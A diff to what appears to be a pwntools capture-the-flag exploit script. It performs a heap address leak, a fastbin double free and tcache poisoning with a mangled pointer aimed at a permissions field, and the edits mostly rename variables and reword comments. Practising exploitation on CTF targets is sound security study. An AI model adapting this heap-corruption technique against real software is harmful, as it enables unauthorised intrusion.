@@ -69,18 +69,14 @@ create(b"c" * 8)
 delete(3)
 
 show()
-io.recvline()
-io.recvline()
-io.recvline()
-io.recvline()
-io.recvline()
-heap_leak = u64(io.recvline().strip().split(b": ")[-1].ljust(8, b"\x00"))
+io.recvuntil(b"3: ")
+heap_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
 log.info(f"{heap_leak=:#x}")
-heap_base = heap_leak << 12
-log.info(f"{heap_base=:#x}")
-user_chunk = heap_base + 0x370
+heap = heap_leak << 12
+log.info(f"{heap=:#x}")
+user_chunk = heap + 0x370
 
-# fill up tcachebins
+# Fill up tcachebins
 payload = b"\n".join([cyclic(0x10)] * 7 + [b"quit"])
 scream(payload)
 
@@ -89,6 +85,7 @@ delete(1)
 delete(2)
 delete(1)
 
+# Empty out tcachebins
 create(b"f" * 8)
 create(b"f" * 8)
 create(b"f" * 8)
@@ -97,9 +94,9 @@ create(b"f" * 8)
 create(b"f" * 8)
 create(b"f" * 8)
 
-# After tcachebins is empty, the fastbins are sorted into tcachebins
+# After tcachebins is empty, the fastbins are dumped into tcachebins
 # which enable us to do tcache poisoning with the fastbin dup earlier
-fd = mangle(heap_base + 0x4f0, user_chunk + 0x80)  # perms field
+fd = mangle(heap + 0x4f0, user_chunk + 0x80)  # perms field
 create(p64(fd))
 create(b"f" * 8)
 create(b"f" * 8)
